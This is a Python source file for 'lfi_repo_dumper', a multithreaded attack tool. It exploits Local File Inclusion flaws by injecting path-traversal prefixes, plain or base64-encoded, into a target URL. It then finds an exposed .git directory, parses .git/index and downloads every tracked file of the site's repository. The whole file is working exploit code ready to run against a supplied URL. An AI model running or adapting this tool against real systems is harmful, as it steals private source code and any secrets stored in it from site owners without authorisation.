#!/usr/bin/env python3

import argparse
import base64
import os
import queue
import re
import struct
import threading
import requests
import urllib3
import sys

urllib3.disable_warnings()

VERSION = "2.0"

MARKERS = [
"$lfi$",
"$prefixlfi$",
"$b64lfi$",
"$b64prefixlfi$"
]

SHA_RE = re.compile(r"[0-9a-f]{40}")

# ------------------------------------------------
# injection
# ------------------------------------------------

def inject(template, path, prefix):

    if "$b64prefixlfi$" in template:
        return template.replace(
            "$b64prefixlfi$",
            base64.b64encode((prefix + path).encode()).decode()
        )

    if "$prefixlfi$" in template:
        return template.replace("$prefixlfi$", prefix + path)

    if "$b64lfi$" in template:
        return template.replace(
            "$b64lfi$",
            base64.b64encode(path.encode()).decode()
        )

    return template.replace("$lfi$", path)


# ------------------------------------------------
# fetch
# ------------------------------------------------

def fetch(session, url, prefix, path):

    target = inject(url, path, prefix)

    try:

        r = session.get(target, timeout=10, verify=False)

        if r.status_code == 200 and r.content:
            return r.content

    except requests.RequestException:
        pass

    return None


# ------------------------------------------------
# git detection
# ------------------------------------------------

def detect_git(session, url, prefix):

    data = fetch(session, url, prefix, ".git/HEAD")

    if not data:
        return False

    s = data.strip()

    if s.startswith(b"ref:"):
        return True

    if SHA_RE.search(s.decode(errors="ignore")):
        return True

    return False


# ------------------------------------------------
# auto prefix scan
# ------------------------------------------------

def auto_prefix(session, url):

    print("[*] Running prefix scan")

    for depth in range(1,12):

        prefix = "../" * depth

        data = fetch(session, url, prefix, ".git/HEAD")

        if not data:
            continue

        if b"ref:" in data or SHA_RE.search(data.decode(errors="ignore")):
            print(f"[+] Found prefix: {prefix}")
            return prefix

    return None


# ------------------------------------------------
# parse git index
# ------------------------------------------------

def parse_index(data):

    entries = []

    if not data.startswith(b"DIRC"):
        return entries

    count = struct.unpack(">I", data[8:12])[0]

    offset = 12

    for _ in range(count):

        sha = data[offset+40:offset+60].hex()

        flags = struct.unpack(">H", data[offset+60:offset+62])[0]

        name_len = flags & 0x0FFF

        path = data[offset+62:offset+62+name_len].decode(errors="ignore")

        entries.append((sha, path))

        entry_len = ((62 + name_len + 8) // 8) * 8

        offset += entry_len

    return entries


# ------------------------------------------------
# worker
# ------------------------------------------------

class Worker(threading.Thread):

    def __init__(self, q, session, url, prefix, output):
        super().__init__(daemon=True)
        self.q=q
        self.session=session
        self.url=url
        self.prefix=prefix
        self.output=output

    def run(self):

        while True:

            try:
                path=self.q.get(timeout=3)
            except queue.Empty:
                return

            data=fetch(self.session,self.url,self.prefix,path)

            if data:

                dest=os.path.join(self.output,path)

                os.makedirs(os.path.dirname(dest),exist_ok=True)

                with open(dest,"wb") as f:
                    f.write(data)

                print("[+] ",path)

            self.q.task_done()


# ------------------------------------------------
# dump index
# ------------------------------------------------

def dump_index(session,url,prefix,output):

    print("[*] Downloading .git/index")

    data=fetch(session,url,prefix,".git/index")

    if not data:
        print("[-] index download failed")
        return None

    entries=parse_index(data)

    print(f"[+] {len(entries)} paths extracted")

    os.makedirs(output,exist_ok=True)

    with open(os.path.join(output,"_index_paths.txt"),"w") as f:

        for sha,path in entries:
            f.write(f"{sha} {path}\n")

    return entries


# ------------------------------------------------
# dump files
# ------------------------------------------------

def dump_files(entries,session,url,prefix,output,jobs):

    print("[*] Starting file dump")

    q=queue.Queue()

    for _,path in entries:
        q.put(path)

    workers=[]

    for _ in range(jobs):
        w=Worker(q,session,url,prefix,output)
        w.start()
        workers.append(w)

    q.join()


# ------------------------------------------------
# main
# ------------------------------------------------

def main():

    parser=argparse.ArgumentParser(

        prog="lfi_repo_dumper",

        description=f"""
LFI Git Repository Dumper v{VERSION}

This tool automatically dumps exposed git repositories via Local File Inclusion.

Features
--------

• LFI marker injection
• auto prefix detection
• git exposure detection
• git index parsing
• repository file dumping
• multithread download

Markers
-------

$lfi$            raw path
$prefixlfi$      prefix + path
$b64lfi$         base64(path)
$b64prefixlfi$   base64(prefix + path)

Example URL
-----------

https://target/view.php?file=$b64prefixlfi$
""",

formatter_class=argparse.RawTextHelpFormatter

)

    parser.add_argument(
        "--url",
        required=True,
        help="URL template containing injection marker"
    )

    parser.add_argument(
        "--prefix",
        default="../../",
        help="Traversal prefix (default ../../)"
    )

    parser.add_argument(
        "--output",
        default="dump",
        help="Output directory"
    )

    parser.add_argument(
        "--jobs",
        type=int,
        default=10,
        help="Download threads"
    )

    parser.add_argument(
        "--auto",
        action="store_true",
        help="Force auto prefix scan"
    )

    args=parser.parse_args()

    session=requests.Session()

    print(f"[*] Target : {args.url}")
    print(f"[*] Prefix : {args.prefix}")
    print(f"[*] Output : {args.output}")
    print()

    prefix=args.prefix

    if not args.auto:

        if not detect_git(session,args.url,prefix):

            print("[-] .git not found with provided prefix")

            prefix=auto_prefix(session,args.url)

            if not prefix:
                print("[-] Could not find .git")
                sys.exit()

    else:

        prefix=auto_prefix(session,args.url)

        if not prefix:
            print("[-] Could not find .git")
            sys.exit()

    entries=dump_index(session,args.url,prefix,args.output)

    if not entries:
        sys.exit()

    dump_files(entries,session,args.url,prefix,args.output,args.jobs)

    print("\n[✓] Repository dump finished")


if __name__=="__main__":
    main()
